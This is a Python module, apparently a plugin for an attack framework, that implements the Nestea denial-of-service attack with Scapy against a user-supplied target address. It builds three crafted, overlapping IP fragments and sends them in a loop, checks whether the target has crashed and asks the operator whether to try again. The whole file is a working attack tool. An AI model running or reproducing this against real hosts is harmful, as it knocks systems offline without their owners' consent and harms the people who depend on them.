import util
from scapy.all import *
from dos import DoS


class nestea_dos(DoS):
    """ Linux-equivalent to the Teardrop DoS, works on 2.0 and 2.1.
        Attack works by sending fragmented datagram pairs to a host.  The
        first host begins at offset 0 (first packet), with a payload of N.
        The following packet is set to overlap within the previous fragment.
    """
    def __init__(self):
        super(nestea_dos, self).__init__('Nestea DoS')
        conf.verb = 0
        self.info = """
                    Linux-equivalent to the teardrop attack, this sends 
                    fragmented datagram packets with overlapping payloads."""

    def initialize(self):
        target = self.config['target']['value']
        try:
            pkt1 = IP(dst=target, id=42, flags="MF") / UDP() / ("X" * 10)
            pkt2 = IP(dst=target, id=42, frag=48) / ("X" * 116)
            pkt3 = IP(dst=target, id=42, flags="MF") / UDP() / ("X" * 224)
            while True:
                util.Msg('DoSing %s...' % target)
                send(pkt1)
                send(pkt2)
                send(pkt3)

                if self.is_alive():
                    util.Msg('Host appears to still be up.')
                    try:
                        tmp = raw_input('[!] Try again? [Y/n] ')
                    except Exception:
                        break
                    if 'n' in tmp.lower():
                        break
                else:
                    util.Msg('Host not responding!')
                    break
        except KeyboardInterrupt:
            return
        except Exception:
            util.Error('Error with given address.  Could not complete DoS.')
            return
